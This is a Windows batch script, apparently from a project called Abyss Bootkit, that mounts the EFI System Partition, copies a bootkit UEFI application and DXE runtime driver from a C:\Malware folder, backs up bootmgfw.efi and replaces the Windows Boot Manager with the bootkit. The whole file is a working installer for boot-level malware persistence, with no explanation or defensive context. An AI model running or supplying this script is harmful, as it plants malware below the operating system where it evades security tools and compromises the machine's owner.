@echo off
setlocal enabledelayedexpansion

:: Parameters
set ESP_DRIVE=U:
set BOOTKIT_FILE1=AbyssBootkit1UEFIApplication.efi
set BOOTKIT_FILE2=AbyssBootkit2DXERuntimeDriver.efi
set LOCAL_SOURCE=C:\Malware
set ESP_FOLDER=%ESP_DRIVE%\EFI\Boot
set MS_BOOTMGR_PATH=%ESP_DRIVE%\EFI\Microsoft\Boot
set BACKUP_NAME=bootmgfw.efi.backup

:: Start
cls
echo ===============================================
echo         Replace Windows Boot Manager
echo ===============================================
echo.

:: Mount ESP
echo [*] Mounting the ESP partition to %ESP_DRIVE
mountvol %ESP_DRIVE% /s
if errorlevel 1 (
	echo [-] Failed to mount the ESP partition. Aborting the operation.
	pause
	exit /b
)
echo [+] ESP partition successfully mounted to %ESP_DRIVE%
echo.

:: Copy the UEFI application and DXE driver to \EFI\Boot
echo [*] Copying the files %BOOTKIT_FILE1% and %BOOTKIT_FILE2% to the \EFI\Boot folder
copy /Y "%LOCAL_SOURCE%\%BOOTKIT_FILE1%" "%ESP_FOLDER%\%BOOTKIT_FILE1%"
copy /Y "%LOCAL_SOURCE%\%BOOTKIT_FILE2%" "%ESP_FOLDER%\%BOOTKIT_FILE2%"
if errorlevel 1 (
	echo [-] An error occurred while copying the files to %ESP_FOLDER%. Aborting.
) else (
	echo [+] Files successfully copied to the \EFI\Boot folder.
)
echo.

:: Check if backup already exists
if exist "%MS_BOOTMGR_PATH%\%BACKUP_NAME%" (
	echo [*] Backup file %BACKUP_NAME% already exists. Skipping backup creation.
) else (
	echo [*] Creating a backup of the original bootmgfw.efi file
	copy /Y "%MS_BOOTMGR_PATH%\bootmgfw.efi" "%MS_BOOTMGR_PATH%\%BACKUP_NAME%"
	if errorlevel 1 (
		echo [-] Failed to create a backup of bootmgfw.efi. Aborting the operation.
		mountvol %ESP_DRIVE% /d
		pause
		exit /b
	)
	echo [+] Backup of bootmgfw.efi saved as %BACKUP_NAME%.
)
echo.

:: Copy the UEFI application to Windows Boot Manager location
echo [*] Copying %BOOTKIT_FILE1% to the Windows Boot Manager location (EFI\Microsoft\Boot\bootmgfw.efi)
copy /Y "%LOCAL_SOURCE%\%BOOTKIT_FILE1%" "%MS_BOOTMGR_PATH%\bootmgfw.efi"
if errorlevel 1 (
	echo [-] Failed to replace bootmgfw.efi in the Windows Boot Manager location. Aborting.
) else (
	echo [+] Successfully replaced bootmgfw.efi with the Abyss Bootkit application at EFI\Microsoft\Boot.
)
echo.

:: Unmount ESP
echo [*] Unmounting the ESP partition from %ESP_DRIVE%
mountvol %ESP_DRIVE% /d
if errorlevel 1 (
	echo [-] Failed to unmount the ESP partition. You may need to unmount it manually.
) else (
	echo [+] ESP partition successfully unmounted.
)

echo.
echo [+] Operation complete.
pause
